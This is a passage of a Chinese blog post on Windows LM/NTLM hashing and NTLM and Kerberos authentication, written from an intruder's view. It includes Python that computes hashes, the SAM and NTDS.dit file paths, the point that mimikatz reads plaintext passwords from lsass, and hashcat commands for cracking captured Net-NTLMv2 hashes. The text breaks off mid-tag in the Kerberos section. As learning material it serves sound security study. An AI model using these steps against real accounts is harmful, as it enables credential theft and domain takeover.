        <content type="html"><![CDATA[<p>我们黑进内网后，最直接获取权限的方法自然是直接获取用户凭证。</p><h1 id="Windows-HASH"><a href="#Windows-HASH" class="headerlink" title="Windows HASH"></a>Windows HASH</h1><h2 id="HASH简介"><a href="#HASH简介" class="headerlink" title="HASH简介"></a>HASH简介</h2><p>hash ，一般翻译做散列，或音译为哈希，所谓哈希，就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一次数学加密函数运算，然后返回一个固定长度的字符串。</p><p>这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。</p><h2 id="windows-HASH简介"><a href="#windows-HASH简介" class="headerlink" title="windows HASH简介"></a>windows HASH简介</h2><p>Windows  加密过的密码口令，我们称之为 hash<br>Windows  系统使用两种方法对用户的密码进行哈希处理，它们分别是 <strong>LAN Manager（LM） 哈希</strong>和 <strong>NT LAN Manager（NTLM）  哈希</strong>。<br>现在已经有了更新的 <strong>NTLMv2  以及 Kerberos</strong>  验证体系。</p><blockquote><p><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p></blockquote><h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM-HASH"></a>LM-HASH</h2><h3 id="LM-HASH简介"><a href="#LM-HASH简介" class="headerlink" title="LM-HASH简介"></a>LM-HASH简介</h3><p>LAN Manager（LM）哈希是Windows系统所用的第一种密码哈希算法，是一种较古老的Hash，在LAN Manager协议中使用，<strong>非常容易通过暴力破解获取明文凭据</strong>。<br>它只有唯一一个版本且一直用到了 NT LAN Manager（NTLM） 哈希的出现，在 Windows XP &#x2F; Windows Server 2003  之前， 它是Windows上占主导地位的密码存储算法。<br>从 Windows Vista &#x2F; Windows Server 2008  开始，默认情况下已禁用该算法。<br><strong>LM  算法是在 DES  基础上实现的，不区分字母大小写。</strong></p><h3 id="LM-HASH生成原理"><a href="#LM-HASH生成原理" class="headerlink" title="LM-HASH生成原理"></a>LM-HASH生成原理</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290753428.png" alt="image-20220729075336294"></p><p>假设用户密码为：password</p><ol><li>用户的密码被限制为<strong>最多14个字符</strong>。</li><li>将用户密码所有字符转换为<strong>大写</strong>： PASSWORD</li><li>密码转换为<strong>16进制字符串</strong>，，密码长度不足14个字符将<strong>用0填充到14个字符</strong></li><li>这14个字符将被<strong>分成两半</strong>： PASSWOR D000000</li><li>每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7位为一组末尾加0（奇偶校验位)，组成新的编码（str_to_key()函数处理）,因此结果为64位： 1101000-&gt; 1101000 0 ，在将这些奇偶校验位相拼接之后，分别作为DES key。</li><li>分别用生成的两个密钥作为key 对 <strong><code>KGS!@#$%</code></strong>  进行DES加密： PASSWOR &#x3D;E52CAC67419A9A22<br> D000000 &#x3D; 4A3B108F3FA6CB6D</li><li>将加密后的两组拼接在一起，得到LM HASH值： E52CAC67419A9A22 4A3B108F3FA6CB6D</li></ol><h3 id="使用python得到LM-HASH值："><a href="#使用python得到LM-HASH值：" class="headerlink" title="使用python得到LM HASH值："></a>使用python得到LM HASH值：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;from passlib.hash import lmhash;print(lmhash.hash(&#x27;password&#x27;))&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">group_just</span>(<span class="params">length,text</span>):</span><br><span class="line">    <span class="comment"># text 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    text_area = re.findall(<span class="string">r&#x27;.&#123;%d&#125;&#x27;</span> % <span class="built_in">int</span>(length), text) <span class="comment"># [&#x27;0011000&#x27;, &#x27;1001100&#x27;, &#x27;1000110&#x27;, &#x27;0110011&#x27;, &#x27;0100001&#x27;, &#x27;1010100&#x27;, &#x27;1101100&#x27;, &#x27;0000000&#x27;]</span></span><br><span class="line">    text_area_padding = [i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> text_area] <span class="comment">#[&#x27;00110000&#x27;, &#x27;10011000&#x27;, &#x27;10001100&#x27;, &#x27;01100110&#x27;, &#x27;01000010&#x27;, &#x27;10101000&#x27;, &#x27;11011000&#x27;, &#x27;00000000&#x27;]</span></span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(text_area_padding) <span class="comment"># 0011000010011000100011000110011001000010101010001101100000000000</span></span><br><span class="line">    hex_int = <span class="built_in">hex</span>(<span class="built_in">int</span>(hex_str, <span class="number">2</span>))[<span class="number">2</span>:].rstrip(<span class="string">&quot;L&quot;</span>) <span class="comment">#30988c6642a8d800</span></span><br><span class="line">    <span class="keyword">if</span> hex_int == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        hex_int = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex_int</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lm_hash</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="comment"># 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span></span><br><span class="line">    pass_hex = password.upper().encode(<span class="string">&quot;hex&quot;</span>).ljust(<span class="number">28</span>,<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line"><span class="comment">#3132333435360000000000000000</span></span><br><span class="line">    <span class="built_in">print</span>(pass_hex) </span><br><span class="line">    <span class="comment"># 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    left_str = pass_hex[:<span class="number">14</span>] <span class="comment">#31323334353600</span></span><br><span class="line">    right_str = pass_hex[<span class="number">14</span>:] <span class="comment">#00000000000000</span></span><br><span class="line">    left_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(left_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    right_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(right_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    <span class="comment"># 3. 再分7bit为一组,每组末尾加0，再组成一组</span></span><br><span class="line">    left_stream = group_just(<span class="number">7</span>,left_stream) <span class="comment"># 30988c6642a8d800</span></span><br><span class="line">    right_stream = group_just(<span class="number">7</span>,right_stream) <span class="comment"># 0000000000000000</span></span><br><span class="line">    <span class="comment"># 4. 上步骤得到的二组，分别作为key 为 &quot;KGS!@#$%&quot;进行DES加密。</span></span><br><span class="line">    left_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,left_stream) <span class="comment">#44efce164ab921ca</span></span><br><span class="line">    right_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,right_stream) <span class="comment"># aad3b435b51404ee</span></span><br><span class="line">    <span class="comment"># 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span></span><br><span class="line">    <span class="keyword">return</span> left_lm + right_lm</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">hash</span> = lm_hash(<span class="string">&quot;123456&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="LM-HASH缺点"><a href="#LM-HASH缺点" class="headerlink" title="LM-HASH缺点"></a>LM-HASH缺点</h3><ol><li>密码长度最大只能为14个字符</li><li>密码不区分大小写 </li><li>如果密码强度是小于7位，那么第二个分组加密后的结果肯定是 aad3b435b51404ee ，如果我们看到 lm hash 的结尾是 aad3b435b51404ee ，就可以很轻易的发现密码强度少于7位</li><li>一个14个字符的密码分成7+7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式使破解难度成倍增加，因为攻击者需要将7个字符（而不是14个字符）强制暴力破解。这使得14个字符的密码的有效强度等于，或者是7个字符的密码的两倍，该密码的复杂度明显低于14个字符的密码的理论强度</li><li>DES密码强度不高</li></ol><h2 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM-HASH"></a>NTLM-HASH</h2><h3 id="NTLM-HASH简介"><a href="#NTLM-HASH简介" class="headerlink" title="NTLM-HASH简介"></a>NTLM-HASH简介</h3><p>NT LAN Manager（NTLM） 哈希是Windows系统认可的另一种算法，用于替代古老的LM-Hash，一般指Windows系统下 <strong>Security Account Manager（SAM） 中保存的用户密码hash</strong>，在 Windows Vista&#x2F;Windows 7&#x2F;Windows Server 2008 以及后面的系统中，NTLM哈希算法默认启用。</p><p>通常意义上的NTLM Hash指存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH（哈希传递），并且通常存在于LSASS进程中，便于 SSP（NTLM 安全支持提供程序）使用</p><h3 id="NTLM-HASH生成原理"><a href="#NTLM-HASH生成原理" class="headerlink" title="NTLM-HASH生成原理"></a>NTLM-HASH生成原理</h3><ol><li>先将用户密码转换为十六进制格式。</li><li>将十六进制格式的密码进行 Unicode 编码。</li><li>使用 MD4 摘要算法对 Unicode  编码数据进行 Hash  计算</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -c &quot;import hashlib,binascii;print binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;123456&#x27;.encode(&#x27;utf-16le&#x27;)).digest())&quot;</span><br><span class="line"></span><br><span class="line">python3 -c &quot;import hashlib,binascii;print(binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;123456&#x27;.encode(&#x27;utf-</span><br><span class="line">16le&#x27;)).digest()).decode())&quot;</span><br></pre></td></tr></table></figure><h2 id="HASH格式"><a href="#HASH格式" class="headerlink" title="HASH格式"></a>HASH格式</h2><p>Windows  的系统密码 hash  默认情况下一般由两部分组成：第一部分是 LM-hash ，第二部分是 NTLM-hash 。<br>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290800924.png" alt="image-20220729080026827"></p><p>前面三个系统，当密码超过14位的时候会采用NTLM加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名称:RID:LM-HASH值:NTLM-HASH值</span><br><span class="line">test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::</span><br></pre></td></tr></table></figure><p>前一部分是LM Hash，后一部分是NTLM Hash</p><p>当LM Hash是 AAD3B435B51404EEAAD3B435B51404EE  这表示 空密码或者是未使用LM_HASH</p><h3 id="sid和rid"><a href="#sid和rid" class="headerlink" title="sid和rid"></a>sid和rid</h3><ul><li>rid是系统对用户的唯一标识。就和sid一样。</li><li>我们拿到rid后，就可以大概的判断现在的用户大概的权限是什么</li><li>在计算机中中sid前面若干位都是相同的！只有最后面的rid是不同的！</li><li>系统自带的用户其rid都在1000内，用户自建的用户rid在1000以上</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sid:</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-500</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-503</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1035</span><br><span class="line">rid:(即sid末尾的三位或者四位数字)：</span><br><span class="line">500</span><br><span class="line">503</span><br><span class="line">1035</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统用户账户的信息</span><br><span class="line">wmic useraccount list brief </span><br><span class="line"></span><br><span class="line">C:\Users\86063&gt;wmic useraccount list brief</span><br><span class="line">AccountType  Caption                   Domain  FullName  Name                SID</span><br><span class="line">512          ALVIN\Administrator       ALVIN             Administrator       S-1-5-21-1963647555-2248327119-2118898007-500</span><br><span class="line">512          ALVIN\DefaultAccount      ALVIN             DefaultAccount      S-1-5-21-1963647555-2248327119-2118898007-503</span><br><span class="line">512          ALVIN\Guest               ALVIN             Guest               S-1-5-21-1963647555-2248327119-2118898007-501</span><br><span class="line">512          ALVIN\Visitor             ALVIN             Visitor             S-1-5-21-1963647555-2248327119-2118898007-1035</span><br><span class="line">512          ALVIN\WDAGUtilityAccount  ALVIN             WDAGUtilityAccount  S-1-5-21-1963647555-2248327119-2118898007-504</span><br><span class="line">512          ALVIN\华年                ALVIN   Alvin Li  华年                S-1-5-21-1963647555-2248327119-2118898007-1001</span><br></pre></td></tr></table></figure><h2 id="HASH存储位置"><a href="#HASH存储位置" class="headerlink" title="HASH存储位置"></a>HASH存储位置</h2><p>windows hash  一般存储在两个地方：</p><ul><li>SAM  文件，存储在本机，对应本地用户</li><li>NTDS.DIT  文件，存储在域控上，对应域用户</li></ul><p>文件位置：(得要用工具查看)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAM：</span><br><span class="line">C:\windows\system32\config\SAM</span><br><span class="line">NTDS.DIT：得到此文件，即可拿下域控</span><br><span class="line">C:\windows\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure><h1 id="Windows认证机制"><a href="#Windows认证机制" class="headerlink" title="Windows认证机制"></a>Windows认证机制</h1><p>Windows的认证包括三个部分：</p><ul><li>本地认证：用户直接操作计算机登录账户</li><li>网络认证：远程连接到工作组中的某个设备</li><li>域认证：登陆到域环境中的某个设备（后面讲到域的时候，会专门讲）</li></ul><p>开始之前需要先区分这几个概念：</p><blockquote><ul><li>NTLM Hash：存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果</li><li>Net-NTLM hash：通常是指网络环境下 NTLM认证中的 Hash~网络认证吼</li><li>NTLM：除 Kerberos之外的一种网络认证协议，只支持 Windows</li></ul></blockquote><h2 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h2><p>本地认证：即当用户登录时，系统将用户输入的明文密码加密成 <em>NTLM Hash</em>，与 SAM数据库中的 <em>NTLM Hash</em> 进行比较，从而实现认证</p><h3 id="认证过程："><a href="#认证过程：" class="headerlink" title="认证过程："></a>认证过程：</h3><p>用户注销、重启、锁屏后，操作系统会让 winlogon显示登录界面，也就是输入框，接收输入后，将密码交给 lsass进程，***<u>这个进程中会存一份明文密码</u>***，将明文密码加密成NTLM Hash，对比 SAM数据库中的 Hash进行验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure><blockquote><ol><li>用户在winlogon.exe中输入密码</li><li>lsass.exe收到密码后将用户输入的密码计算成NTLM Hash</li><li>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对</li><li>匹配则登陆成功，不匹配则登陆失败</li></ol></blockquote><p>NTLM哈希，是一种单向哈希算法，Windows将用户的密码计算成NTLM哈希之后才存储在电脑中。(上文有讲)</p><h3 id="细节："><a href="#细节：" class="headerlink" title="细节："></a>细节：</h3><p>更具体体会上面的步骤，一些细节需要讲解：</p><ul><li><p>winlogon.exe：我们Windows登录界面是由一个叫winlogon.exe的进程产生（也就是通俗来讲的登陆界面），用户在该进程中输入的密码交由lsass.exe处理</p></li><li><p>lsass.exe：<strong>本地认证中用来处理用户输入密码的进程为 lsass.exe  ,密码会在这个进程中明文保存，供该进程将密码计算成 NTLM Hash  与 sam  进行比对，我们使用 mimikatz  来获取的明文密码，便是在这个进程中读取到的</strong></p><p>lsass.exe(本地安全授权进程local security authority process)。Windows系统的安全机制（系统进程）。用于本地安全和登陆策略。</p></li><li><p>SAM：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAM文件的路径是 %SystemRoot%\system32\config\sam</span><br></pre></td></tr></table></figure></li></ul><p>大致的运算流程为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户密码 -&gt; HEX编码 -&gt; Unicode编码 -&gt; MD4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install passlib</span><br><span class="line">&gt;&gt;&gt; from passlib.hash import nthash</span><br><span class="line">&gt;&gt;&gt; print(nthash.hash(&#x27;admin&#x27;))</span><br><span class="line">209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><h2 id="Windows网络认证"><a href="#Windows网络认证" class="headerlink" title="Windows网络认证"></a>Windows网络认证</h2><p>网络认证即在工作组环境下远程登陆另一台电脑所采用的认证机制，可以以Windows的远程桌面（rdp协议）为例<br>NTLM  协议的认证过程分为三步，也叫<strong>挑战&#x2F;响应机制</strong>：</p><h3 id="1、协商"><a href="#1、协商" class="headerlink" title="1、协商"></a>1、协商</h3><p>双方确定使用的协议版本， NTLM  存在V1和V2两个版本，即 Net-NTLM v1 hash 、 Net-NTLM v2 hash ，具体区别就是加密方式不同</p><p>在 NTLM 认证中， NTLM 响应分为 NTLM v1 ， NTLMv2 ， NTLM session v2 三种协议，不同协议使用不同格式的 Challenge  和加密算法</p><h3 id="2、质询"><a href="#2、质询" class="headerlink" title="2、质询"></a>2、质询</h3><p>挑战（Chalenge）&#x2F; 响应（Response）认证机制的核心</p><ol><li>客户端向服务器端发送用户信息(仅有用户名)请求</li><li>服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如果有，生成一个16位的随机数，被称之为” Challenge “， 然后使用登录用户名对应的 NTLM Hash 加密Challenge(16位随机字符)， 生成 Challenge1 保存在内存中。同时，生成 Challenge1后，将 Challenge (16位随机字符)明文发送给客户端。</li><li>客户端接受到 Challenge 后，使用自己提供的账户的密码转换成对应的 NTLM Hash ，然后使用这个 NTLM Hash 加密 Challenge 生成 Response ，然后将 Response 发送至服务器端。</li></ol><blockquote><p>经过 NTLM Hash加密 Challenge的结果在网络协议中称之为 Net NTLM Hash</p></blockquote><h3 id="3、验证"><a href="#3、验证" class="headerlink" title="3、验证"></a>3、验证</h3><p>在质询完成后，验证结果，是认证的最后一步。<br>服务端收到客户端发送的 Response 后，与之前保存在内存中的 Channelge1 比较，如果相等认证通过</p><p>其中，经过 NTLM Hash 加密 Challenge 的结果在网络协议中称之为 <strong>Net NTLM Hash</strong> （但是呢 我们不直接用来进行哈希传递攻击，可以通过<strong>暴力破解来获取明文密码</strong>）</p><blockquote><p>hash传递攻击：在讲到pth（pass the hash）的时候会讲到</p></blockquote><p>其中的关键点在于：第二步质询的操作中客户端发送给服务端的是 <strong>NTLM  哈希值与随机字符串加密的结果</strong>Response，而这个 <u>NTLM  哈希是由用户输入的密码本地计算得出的</u>，所以在这个步骤中，只要能提供正确的 NTLM  哈希即使不知道正确的密码也可通过认证!!</p><h3 id="Net-NTLM-Hash的破解"><a href="#Net-NTLM-Hash的破解" class="headerlink" title="Net NTLM Hash的破解"></a>Net NTLM Hash的破解</h3><p>需要用到hash密码破解的神器——hashcat，支持破解的协议非常的多</p><blockquote><p><a href="https://hashcat.net/wiki/doku.php">https://hashcat.net/wiki/doku.php</a>?</p><p>Hashcat的使用手册总结：<a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a></p></blockquote><p>下面使常见的参数，想了解更多的参数可以hashcat –help查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span><br><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show  显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span><br><span class="line">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span><br><span class="line">--remove     删除已被破解成功的hash</span><br><span class="line">-r       使用自定义破解规则</span><br></pre></td></tr></table></figure><p>NTLMv2的格式为：  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 net-ntlm /tmp/password.list -o found.txt --force</span><br><span class="line">-m：hash-type即hash使用的协议，5600对应的是NetNTLMv2。详细支持的协议的参数可查表</span><br><span class="line">-o：输出文件 字典文件为/tmp/password.list</span><br><span class="line">--force：代表强制执行，测试系统不支持Intel OpenCL</span><br></pre></td></tr></table></figure><h2 id="域认证"><a href="#域认证" class="headerlink" title="域认证"></a>域认证</h2><p>在我看来，域认证：域内一台主机向另一台主机（server）发起请求，但是呢，我们身份的校验是在DC上，DC上面的ntds.dit数据库存储了域内所有主机的账号秘密hash，当我们身份在DC上通过校验时才能拿到访问server的方式~~。</p><h3 id="Kerberos简单介绍"><a href="#Kerberos简单介绍" class="headerlink" title="Kerberos简单介绍"></a>Kerberos简单介绍</h3><ul><li>Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机&#x2F;服务器应用程序提供强大的认证服务。</li><li>该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。全部的操作都交由DC，DC允许你可以访问，你就不可以访问，不然的话，怎么都是不许的（霸道总裁</li><li>在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</li></ul><p>域内认证即采用了Kerberos协议的认证机制，与前两者相比最大的区别是有个一个可信的第三方机构KDC的参与。</p><p>参与域认证的三个角色：</p><blockquote><ul><li><p>Client</p></li><li><p>Server</p></li><li><p>KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</p><p><strong>从物理层面看，AD与AS，TGS，KDC均为域控制器(Domain Controller)。</strong></p></li></ul></blockquote><h3 id="Kerberos认证协议及域相关知识的基础概念"><a href="#Kerberos认证协议及域相关知识的基础概念" class="headerlink" title="Kerberos认证协议及域相关知识的基础概念"></a>Kerberos认证协议及域相关知识的基础概念</h3><ul><li>活动目录：</li></ul><p>活动目录AD：Active Diretory，是指域环境中提供目录服务的组件。目录用于存储有关<strong>网络对象</strong>（例如用户、组、计算机、共享资源、打印机和联系人等)的<strong>信息</strong>。能够快速、准确的从目录中找到其所需的信息的服务，为企业提供了网络环境集中式管理的机制。</p><p>活动目录主要的功能：</p><blockquote><ul><li>账号集中管理：所有的账户都存储在服务器中，可以方便快捷的<strong>执行命令和管理密码</strong>等。</li><li>软件集中管理：能够统一推送软件，安装网络打印机等服务器</li><li>环境集中管理：统一客户端桌面、IE等</li><li>增强安全性：统一部署杀软，统一执行病毒扫描任务、集中管理用户的计算机权限，统一指定密码策略。</li><li>更加的可靠更短的宕机时间</li></ul></blockquote><p>在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p><ul><li><p>票据(Ticket)：是网络对象<strong>互相访问</strong>的凭证。可以比喻为车票</p></li><li><p>TGT(Ticket Granting Ticket)：看英文名就知道 票据生成&#x2F;授予票据，用来生成Ticket的Ticket。就是生成网络对象之间访问的票据所需要的票据。如果将我们最终生成的网络对象之间访问的票据比喻为我们的火车票，那么TGT就是我们购买车票时验证我们身份的身份证~~另外，TGT在TGS上生成我们的最终Ticket！此时，我们的TGS就可以比喻为我们的售票机~，用来生成车票（ticket）。</p><p>由身份认证服务（AS）授予的票据(<strong>黄金票据</strong>)，用于身份认证，存储在内存，默认有效期为10小时。也就是这张在域内的身份证有效期只有十个小时</p></li><li><p>AD(Account Database)：存储域中所有用户的用户名和对应的NTLM Hash，可以理解为域中的SAM数据库，KDC可以从AD中提取域中所有用户的NTLM Hash，这是Kerberos协议能够成功实现的基础。</p></li><li><p>KDC(Key Distribution Center)：密钥分发中心，负责管理票据、认证票据、分发票据，里面包含两个服务：AS和TGS</p></li></ul><blockquote><p>KDC 提供两个核心服务:</p><ul><li>身份验证服务(AS - Authentication Server)：对Client进行身份验证并且向Client生成和发出TGT票证的服务，，也用来完成对Client的身份验证;前面将TGT比喻为身份证，那么AS对Client身份进行认证，自然就是兼饰“公安局”的角色，对Client(身份证)进行办法TGT（身份证）确认其身份~~~</li><li>票证授予&#x2F;生成服务(TGS - Ticket Granting Server)：接受经过身份验证的客户机并向其发出票证以访问其他资源。为Client生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访问对应的服务，该服务提供的票据也称为 Ticket 或者叫<strong>白银票据</strong>。比喻为售票机，用来生成车票Ticket~~</li></ul></blockquote><h4 id="注意下面几点："><a href="#注意下面几点：" class="headerlink" title="注意下面几点："></a>注意下面几点：</h4><ul><li>Client 密钥 、TGS密钥 和 Service 密钥 均为对应用户的NTLM Hash，用对应用户的NTML hash加密DC和对应用户之间的交互信息~~后面会提到</li></ul><blockquote><ul><li>TGS密钥 &#x3D;&#x3D; KDC Hash &#x3D;&#x3D; krbtgt用户的NTLM Hash</li></ul><blockquote><p>krbtgt用户是域控独有用户，我们无法直接登录该用户，但该用户也有NTLM hash，kerberos认证时会用到</p></blockquote><ul><li>关于Service Hash</li></ul><blockquote><p>Service Hash其实是目标中一个用户名与hostname相同的用户的Hash 。如hostname为PC-WIN7的服务器，对应的Hash就是Username : PC-WIN7$的哈希。</p><p>service hash也是存储在域控之中~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141410834.png" alt="image-20220809172642251" style="zoom:50%;" /><p>再比如这个WEB$机器</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208232335629.png" alt="image-20220823233540388"></p></blockquote></blockquote><ul><li>Server 和 Service可以当作一个东西，就是Client想要访问的服务器或者服务</li><li>注意区分（Client&#x2F;TGS&#x2F;Server) Sessionkey和（Client&#x2F;TGS&#x2F;Service)密钥：</li></ul><blockquote><ul><li>（Client&#x2F;TGS&#x2F;Server) Sessionkey  ： 可以看作客户端与TGS服务和尝试登陆的Server之间会话时用来加密的<strong>密钥</strong>，</li><li>（Client&#x2F;TGS&#x2F;Service)密钥：(上面提到的三个实际为NTLM Hash的密钥)，是用来加密会话<strong>密钥的密钥</strong>，为了保证会话密钥的传输安全，这些加密方式均为对称加密。</li></ul><blockquote><p>参与认证的三个角色的 NTLM Hash  是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥 Sessionkey  的安全传输</p></blockquote><p><u>仔细体会上述两者的区别，一个是密钥，一个是加密密钥的密钥~~</u></p></blockquote><h3 id="Kerbreros认证流程"><a href="#Kerbreros认证流程" class="headerlink" title="Kerbreros认证流程"></a>Kerbreros认证流程</h3><p>Client向KDC发起服务请求，希望获取访问Server的权限。 KDC得到了这个消息，首先得判断Client是否是可信赖的， 也就是从AD数据库中寻找该用户是否可用来登录。这就是AS服务完成的工作，成功后，AS返回TGT给Client。</p><p>Client得到了TGT后，继续向KDC请求，希望获取访问Server的权限。KDC又得到了这个消息，这时候通过Client 消息中的TGT，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。（TGS服务的任务）</p><p>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，如果要访问其他Server需要向KDC重新申请。</p><p>下图综述了Kerberos认证过程~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355638.png" alt="image-20220809164958412" style="zoom:50%;" /><p>接下来详细讲讲每一小步</p><h4 id="1-用户登录"><a href="#1-用户登录" class="headerlink" title="1. 用户登录"></a>1. 用户登录</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355621.png" alt="image-20220809165025241" style="zoom: 33%;" /><ul><li>用户输入 [用户名] 和 [密码] 信息</li><li>在客户端，用户输入的 [密码] 通过计算生成NTLM哈希作做为 [Client密钥]</li></ul><h4 id="2-请求身份认证（与AS校验）"><a href="#2-请求身份认证（与AS校验）" class="headerlink" title="2. 请求身份认证（与AS校验）"></a>2. 请求身份认证（与AS校验）</h4><h5 id="2-1-客户端向AS-身份认证服务-发送认证请求"><a href="#2-1-客户端向AS-身份认证服务-发送认证请求" class="headerlink" 